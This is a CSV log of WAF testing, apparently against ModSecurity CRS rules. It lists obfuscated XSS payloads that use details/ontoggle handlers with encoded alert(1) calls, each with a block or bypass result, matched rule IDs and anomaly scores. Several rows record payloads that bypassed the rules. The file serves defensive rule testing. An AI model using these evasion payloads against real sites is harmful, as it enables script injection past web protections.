1316,"<details open ontoggle='new Function([""\u0061\u006c\u0065\u0072\u0074"",""\u0028"",""\u0031"",""\u0029""].join``)()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603436897.196300
1317,<details open ontoggle='new Function(`\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029`)()'></details>,0,1,block,4,"934100,941100,941120,949110","o24,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603436994.457893
1321,"<details open ontoggle='new Function(""\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"")()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603437372.778551
1322,"<details open ontoggle='new Function(""ale""+""rt(1)"")()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760343747.163641
1324,"<details open ontoggle='new Function(""\141\154\145\162\164(1)"")()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603437659.397690
1325,"<details open ontoggle='new Function((""\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029""))()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603437756.710715
1327,"<details open ontoggle='new Function(unescape(""%61%6c%65%72%74%2831%29""))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,87 || o24,13v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603437932.156568
1328,"<details open ontoggle='new(Function)(""\\u0061\\u006c\\u0065\\u0072\\u0074(1)"")()'></details>",0,1,block,4,"933210,941100,941120,949110","o27,54v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760343802.197438
1329,"<details open ontoggle='new window.Function(""\\u0061\\u006c\\u0065\\u0072\\u0074(1)"")()'></details>",0,1,bypass,2,"941100,941120","v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603438155.616159
1330,"<details open ontoggle='new Function(""\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"".toString())()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603438223.685448
1331,<details open ontoggle='new Function`\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029`()'></details>,0,1,bypass,2,"941100,941120","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603438348.050612
1334,"<details open ontoggle='new Function(""return al""+""ert"")(1)()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,24v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,62 || o24,13v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760343865.448666
1335,"<details open ontoggle='new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116))()(1)'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603438790.501734
1336,"<details open ontoggle='new(Function)(""return al""+""ert"")(1)()'>",0,1,block,4,"933210,941100,941120,949110","o27,34v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603438856.706427
1338,"<details open ontoggle='new Function(""retu""+""rn al""+""ert"")(1)()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,27v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603439174.203606
1339,<details open ontoggle='new Function(`return al`+`ert`)(1)()'>,0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,62 || o24,13v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603439285.049319
1340,"<details open ontoggle='new Function(atob(""cmV0dXJuIGFsZXJ0""))(1)()'>",0,1,block,5,"933210,934100,941100,941120,949110","o36,31v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603439338.371432
1341,"<details open ontoggle='new/**/ Function(""return al"" + ""ert"")(1)()'>",0,1,block,4,"933210,941100,941120,949110","o36,24v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603439415.143828
1343,"<details open ontoggle='new Function(""return\x20al""+""ert"")(1)()'>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603439623.062832
1344,"<details open ontoggle='new Function(""\162\145\164\165\162\156\40\141\154\145\162\164"")(1)()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603439713.400202
1345,"<details open ontoggle='new Function(""return""+"" al""+""ert"")(1)()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,27v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603439869.529477
1346,"<details open ontoggle='new Function(""return al"".concat(""ert""))(1)()'>",0,1,block,5,"933210,934100,941100,941120,949110","o36,32v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760343997.346470
1347,"<details open ontoggle='new Function([""return al"",""ert""].join(""""))(1)()'>",0,1,block,5,"933210,934100,941100,941120,949110","o61,10v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603440078.358984
1348,"<details open ontoggle='new Function(""return\u0020al""+""ert"")(1)()'>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,67 || o24,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603440143.449783
1349,"<details open ontoggle='new Function(""return\x09al""+""ert"")(1)()'>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603440276.192515
1352,"<details open ontoggle='new Function(String[""fromCh""+""arCode""](114,101,116,117,114,110,32,97,108,101,114,116))()(1)'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,79v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,117 || o24,13v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760344054.426986
1355,"<details open ontoggle='new Function(String[""fromCha\u0072Code""](97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760344088.209448
1356,"<details open ontoggle='new Function(atob(""YWxlcnQoMSk""))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v216,61 || v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603440960.057384
1357,"<details open ontoggle='new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603441085.066550
1358,"<details open ontoggle='new Function(String[`fromCharCode`](97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603441149.990590
1359,"<details open ontoggle='new(Function)(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,5,"933210,934100,941100,941120,949110","o27,62v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o38,19v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603441240.423802
1362,"<details open ontoggle='new&#10;Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o41,19v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603441529.476079
1363,"<details open ontoggle='new Function(String.fromCharCode.call(null,97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603441618.299948
1364,"<details open ontoggle='new Function(String.fromCharCode.apply(null,[97,108,101,114,116,40,49,41]))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603441844.039861
1366,<details open ontoggle='new Function(`al`+`ert(1)`)()'>,0,1,block,5,"934100,934100,941100,941120,949110","o24,13v216,55 || o24,13v216,55t:urlDecodeUni || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603442076.520902
1367,<details open ontoggle='new Function(atob(`YWxlcnQoMSk`))()'>,0,1,block,4,"934100,941100,941120,949110","o24,13v216,61 || v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603442183.032544
1368,"<details open ontoggle='new Function(String[""\u0066romCharCode""](97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603442295.794351
1369,"<details open ontoggle='new Function(String[""from""+""CharCode""](97,108,101,114,116,40,49,41))()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,58v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,96 || o24,13v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603442337.914728
1370,"<details open ontoggle='new Function(String[""fro\u006dCharCode""](97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760344246.147521
1371,"<details open ontoggle='new Function([...String.fromCharCode(97,108,101,114,116,40,49,41)].join(``))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603442546.099717
1372,"<details open ontoggle='new Function(String[""\x66rom\u0043harCode""](97,108,101,114,116,40,49,41))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603442668.121848
1373,"<details open ontoggle='new Function(String.fromCharCode(...[97,108,101,114,116,40,49,41]))()'>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603442754.332366
1374,"<details open ontoggle='new Function([""\u0061lert"",""(1)""].join``)()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760344280.215431
1376,"<details open ontoggle='new Function(""\141\154\145\162\164\050\061\051"")()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760344313.158135
1377,<details open ontoggle='new/**/ Function(`\u0061lert(1)`)()'></details>,0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603443284.381180
1378,<details open ontoggle='new/**/Function/**/(`\u0061lert(1)`)()'></details>,0,1,bypass,2,"941100,941120","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603443365.477871
1380,<details open ontoggle='new window[`Function`](`\u0061lert(1)`)()'></details>,0,1,block,4,"941100,941120,941370,949110","v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,77t:urlDecodeUni,t:compressWhitespace || ",15,177603443564.693000
1381,<details open ontoggle='new self[`Function`](`\u0061lert(1)`)()'></details>,0,1,block,4,"941100,941120,941370,949110","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,75t:urlDecodeUni,t:compressWhitespace || ",15,17760344369.306532
1383,<details open ontoggle='new(Function)(`\u0061lert(1)`)()'></details>,0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603443889.691660
1385,<details open ontoggle='new&#09;Function(`\u0061lert(1)`)()'></details>,0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603444070.368155
1387,<details open ontoggle='new Function(`\u0061ler`+`t(1)`)()'></details>,0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,70 || o24,13v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603444260.549875
1388,<details open ontoggle='new Function(`\u0061`+`lert(1)`)()'></details>,0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,70 || o24,13v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603444354.288251
1389,"<details open ontoggle='new Function(""\u0061""+""lert(1)"")()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,70 || o24,13v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603444431.227310
1390,"<details open ontoggle='new Function(String.fromCodePoint(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760344450.886500
1391,"<details open ontoggle='new Function([...""\u0061lert(1)""].join``)()'></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603444623.971325
1392,"<details open ontoggle=(function(){eval(String['fromCharCode'](97,108,101,114,116,40,49,41));})()>",0,1,block,7,"932100,933160,933210,934100,941100,941120,949110","o32,7v217,98 || o35,62v217,98 || o23,74v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603444754.884553
1393,<details open ontoggle=(function(){eval(atob('YWxlcnQoMSk='));})()>,0,1,block,6,"932100,933160,934100,941100,941120,949110","o32,7v217,67 || o35,31v217,67 || o24,11v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603444844.245900
1396,"<details open ontoggle=(function(){eval(String.fromCodePoint(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o32,7v217,96 || o35,60v217,96 || o24,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603445246.403417
1398,"<details open ontoggle=(function(){window['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o23,81v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,14v217,105t:urlDecodeUni,t:compressWhitespace || ",25,177603445466.816362
1399,<details open ontoggle=(function(){eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'));})()>,0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o32,7v217,93 || o35,57v217,93 || o24,11v217,93 || o24,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603445577.291922
1402,<details open ontoggle=(function(){eval(unescape('%61%6c%65%72%74%28%31%29'));})()>,0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o32,7v217,83 || o35,47v217,83 || o24,11v217,83 || o24,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603445824.615130
1404,"<details open ontoggle=(function(){(0,eval)(String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,75v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603446095.218047
1405,"<details open ontoggle=(function(){globalThis['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,85v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603446182.283018
